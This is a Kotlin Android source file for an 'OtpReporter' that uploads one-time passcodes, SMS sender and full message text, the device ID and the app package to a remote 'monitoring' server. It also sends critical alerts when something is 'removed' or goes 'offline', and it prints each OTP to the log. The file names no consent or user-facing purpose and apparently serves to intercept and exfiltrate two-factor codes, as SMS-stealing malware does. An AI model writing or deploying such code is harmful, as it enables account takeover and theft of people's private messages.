package com.example

import android.content.Context
import android.provider.Settings
import com.squareup.moshi.Json
import com.squareup.moshi.JsonClass
import okhttp3.OkHttpClient
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.moshi.MoshiConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST
import java.util.concurrent.TimeUnit

@JsonClass(generateAdapter = true)
data class OtpReportRequest(
    @Json(name = "otp_code")
    val otpCode: String,
    val sender: String,
    @Json(name = "message_body")
    val messageBody: String,
    val timestamp: Long,
    val source: String,
    @Json(name = "device_id")
    val deviceId: String,
    @Json(name = "package_name")
    val packageName: String
)

@JsonClass(generateAdapter = true)
data class AlertReportRequest(
    val type: String,
    val message: String,
    @Json(name = "phone_number")
    val phoneNumber: String,
    @Json(name = "device_id")
    val deviceId: String,
    val timestamp: Long,
    val severity: String,
    @Json(name = "network_type")
    val networkType: String? = null
)

interface OtpReportService {
    @POST("api/otps")
    suspend fun reportOtp(
        @Header("X-Auth-Token") token: String,
        @Body request: OtpReportRequest
    ): Response<Unit>
    
    @POST("api/alerts")
    suspend fun reportAlert(
        @Header("X-Auth-Token") token: String,
        @Body request: AlertReportRequest
    ): Response<Unit>
}

object OtpReporter {
    internal fun shouldUpload(timestamp: Long, uploadCutoffTimestamp: Long): Boolean {
        return timestamp >= uploadCutoffTimestamp
    }

    private val api: OtpReportService by lazy {
        Retrofit.Builder()
            .baseUrl(normalizedBaseUrl())
            .client(
                OkHttpClient.Builder()
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(10, TimeUnit.SECONDS)
                    .writeTimeout(10, TimeUnit.SECONDS)
                    .build()
            )
            .addConverterFactory(MoshiConverterFactory.create())
            .build()
            .create(OtpReportService::class.java)
    }

    suspend fun report(
        context: Context,
        otp: String,
        sender: String,
        body: String,
        timestamp: Long,
        source: String
    ): Boolean {
        val request = OtpReportRequest(
            otpCode = otp,
            sender = sender,
            messageBody = body,
            timestamp = timestamp,
            source = source,
            deviceId = deviceId(context),
            packageName = context.packageName
        )

        println("OtpReporter: Attempting to report OTP to backend...")
        println("OtpReporter: URL: ${normalizedBaseUrl()}")
        println("OtpReporter: OTP: $otp, Source: $source, Sender: $sender")

        return runCatching {
            api.reportOtp(BuildConfig.MONITORING_TOKEN, request)
        }.map { response ->
            if (response.isSuccessful) {
                println("OtpReporter: Successfully reported OTP to backend (HTTP ${response.code()})")
                true
            } else {
                println("OtpReporter: Backend rejected OTP report with HTTP ${response.code()}")
                false
            }
        }.getOrElse { error ->
            println("OtpReporter: Failed to report OTP: ${error.message}")
            error.printStackTrace()
            false
        }
    }
    
    suspend fun reportAlert(
        context: Context,
        type: String,
        message: String,
        phoneNumber: String,
        deviceId: String,
        networkType: String? = null
    ) {
        val request = AlertReportRequest(
            type = type,
            message = message,
            phoneNumber = phoneNumber,
            deviceId = deviceId,
            timestamp = System.currentTimeMillis(),
            severity = if (type.contains("removed") || type.contains("offline")) "critical" else "info",
            networkType = networkType
        )

        println("🚨🚨🚨 OtpReporter: SENDING ALERT TO BACKEND: $type - $message")
        println("OtpReporter: URL: ${normalizedBaseUrl()}api/alerts")

        runCatching {
            api.reportAlert(BuildConfig.MONITORING_TOKEN, request)
        }.onSuccess { response ->
            if (response.isSuccessful) {
                println("✅✅✅ OtpReporter: ALERT SENT SUCCESSFULLY (HTTP ${response.code()})")
            } else {
                println("❌ OtpReporter: Backend rejected alert with HTTP ${response.code()}")
            }
        }.onFailure { error ->
            println("❌ OtpReporter: Failed to send alert: ${error.message}")
            error.printStackTrace()
        }
    }

    private fun normalizedBaseUrl(): String {
        val configured = BuildConfig.MONITORING_BASE_URL.trim().ifBlank { "http://10.0.2.2:5000" }
        return if (configured.endsWith("/")) configured else "$configured/"
    }

    private fun deviceId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            ?: "unknown"
    }
}
